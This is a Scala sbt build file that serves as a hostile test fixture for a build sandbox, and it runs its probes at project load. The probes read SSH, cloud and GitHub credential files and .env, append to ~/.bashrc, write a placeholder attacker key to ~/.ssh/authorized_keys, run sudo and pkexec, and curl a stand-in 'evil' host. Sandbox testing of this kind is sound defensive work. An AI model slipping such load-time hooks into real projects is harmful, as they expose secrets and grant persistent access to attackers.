// Hostile-but-realistic sbt build — exercises every attack in
// fixtures/ATTACKS.md AND compiles a small cats-effect service so the test
// exercises real Scala code (cats + cats-effect IO + MUnit).
//
// We keep the dep tree small on purpose: a cold-cache fetch of http4s +
// circe-generic + cats-effect dominates CI runtime (8+ minutes); cats-core
// + munit-cats-effect proves the same "real Scala compiles under sbe"
// signal in <2 min on a cold cache.
//
// build.sbt is Scala code evaluated at project-load time (before any
// `compile` task runs), so the attacks fire when the user types
// `sbt compile`, `sbt run`, `sbt test`, `sbt about`, etc. Each probe
// prints exactly one of:
//   SAFE: <id> <reason>
//   PWNED: <id> <evidence>
//
// CI greps for PWNED: and fails on any occurrence.

import java.io.{BufferedWriter, File, FileWriter}
import java.nio.file.{Files, Paths}
import java.util.concurrent.TimeUnit
import scala.util.Try

ThisBuild / scalaVersion := "2.13.14"
ThisBuild / organization := "com.sbetest"
ThisBuild / version      := "0.1.0"

val CatsEffectVersion      = "3.5.4"
val MUnitCatsEffectVersion = "2.0.0"

lazy val root = (project in file("."))
  .settings(
    name := "test-bad-scala",
    libraryDependencies ++= Seq(
      "org.typelevel" %% "cats-effect"       % CatsEffectVersion,
      "org.typelevel" %% "munit-cats-effect" % MUnitCatsEffectVersion % Test,
    ),
    Test / testFrameworks += new TestFramework("munit.Framework"),
  )

// --- attack matrix ---

val HOME = sys.env.getOrElse("HOME", "/tmp")
val ExecTimeoutSeconds = 5L

def report(id: String, ok: Boolean, msg: String): Unit = {
  val tag = if (ok) "SAFE" else "PWNED"
  System.err.println(s"$tag: $id $msg")
}

def tryRead(id: String, path: String): Unit =
  Try(Files.readAllBytes(Paths.get(path))) match {
    case scala.util.Success(buf) if buf.length == 0 => report(id, ok = true,  s"readable but empty: $path")
    case scala.util.Success(buf)                    => report(id, ok = false, s"read ${buf.length} bytes from $path")
    case scala.util.Failure(e)                      => report(id, ok = true,  s"blocked: ${e.getMessage}")
  }

def tryAppend(id: String, path: String, payload: String): Unit = {
  val f   = new File(path)
  val res = Try {
    Option(f.getParentFile).foreach(_.mkdirs())
    val w = new BufferedWriter(new FileWriter(f, /*append=*/ true))
    try w.write(payload)
    finally w.close()
  }
  res match {
    case scala.util.Success(_) => report(id, ok = false, s"wrote to $path")
    case scala.util.Failure(e) => report(id, ok = true,  s"blocked: ${e.getMessage}")
  }
}

/** Bounded subprocess runner. Uses Java's ProcessBuilder + waitFor(timeout)
  * so a hung child (e.g., scala.sys.process plumbing waiting on
  * pipe-drain threads after a Landlock-denied execve) can never stall
  * the build. Output streams are discarded — we only care about exit
  * status.
  */
def runWithTimeout(cmd: Seq[String]): Either[Throwable, Either[Int, String]] = {
  try {
    val pb = new ProcessBuilder(cmd: _*)
    pb.redirectErrorStream(true)
    pb.redirectOutput(ProcessBuilder.Redirect.DISCARD)
    pb.redirectInput(ProcessBuilder.Redirect.from(new File("/dev/null")))
    val p = pb.start()
    if (!p.waitFor(ExecTimeoutSeconds, TimeUnit.SECONDS)) {
      p.destroyForcibly()
      Right(Right(s"timed out after ${ExecTimeoutSeconds}s"))
    } else {
      Right(Left(p.exitValue()))
    }
  } catch {
    case e: Throwable => Left(e)
  }
}

def tryExec(id: String, program: String, args: Seq[String]): Unit =
  runWithTimeout(program +: args) match {
    case Right(Left(0))    => report(id, ok = false, s"exec $program succeeded")
    case Right(Left(rc))   => report(id, ok = true,  s"exec $program returned $rc (likely sandboxed)")
    case Right(Right(why)) => report(id, ok = true,  s"exec $program $why")
    case Left(e)           => report(id, ok = true,  s"blocked: ${e.getMessage}")
  }

def tryCurl(id: String, url: String): Unit = {
  // Capture stdout for the HTTP code; ProcessBuilder.start() with PIPE
  // is fine here because we waitFor with a timeout.
  try {
    val pb = new ProcessBuilder(
      "/usr/bin/curl", "-sSL", "--max-time", "5", "-o", "/dev/null",
      "-w", "%{http_code}", url
    )
    pb.redirectErrorStream(false)
    val p = pb.start()
    val finished = p.waitFor(ExecTimeoutSeconds + 2, TimeUnit.SECONDS)
    if (!finished) {
      p.destroyForcibly()
      report(id, ok = true, s"timed out fetching $url (likely sandboxed)")
    } else {
      val code = scala.io.Source.fromInputStream(p.getInputStream).mkString.trim
      if (p.exitValue() == 0 && code.startsWith("2")) report(id, ok = false, s"HTTP $code from $url")
      else                                            report(id, ok = true,  s"blocked: curl exit=${p.exitValue()} http=$code")
    }
  } catch {
    case e: Throwable => report(id, ok = true, s"blocked: ${e.getMessage}")
  }
}

// sbt 1.x's build.sbt DSL requires top-level statements to be settings or
// definitions; bare side-effect expressions raise "type mismatch; found:
// Unit". Bind the attack matrix to a private val so it's a valid
// definition. The val is evaluated eagerly when sbt loads the project,
// which is exactly when we want the probes to fire (before any task runs).
@SuppressWarnings(Array("UnusedDeclaration"))
val _attackMatrix: Unit = {
  tryRead("ssh-read",      s"$HOME/.ssh/id_ed25519")
  tryRead("aws-read",      s"$HOME/.aws/credentials")
  tryRead("gcloud-read",   s"$HOME/.config/gcloud/credentials.db")
  tryRead("gh-token-read", s"$HOME/.config/gh/hosts.yml")
  tryRead("env-read",      "./.env")
  tryAppend("bashrc-write",          s"$HOME/.bashrc",                "\n# pwned\n")
  tryAppend("authorized-keys-write", s"$HOME/.ssh/authorized_keys",   "\nssh-rsa AAAAATTACKER attacker@evil\n")
  tryExec("sudo-exec",   "/usr/bin/sudo",   Seq("-l"))
  tryExec("pkexec-exec", "/usr/bin/pkexec", Seq("--version"))
  tryCurl("curl-evil",   "https://evil.example.invalid/")
}
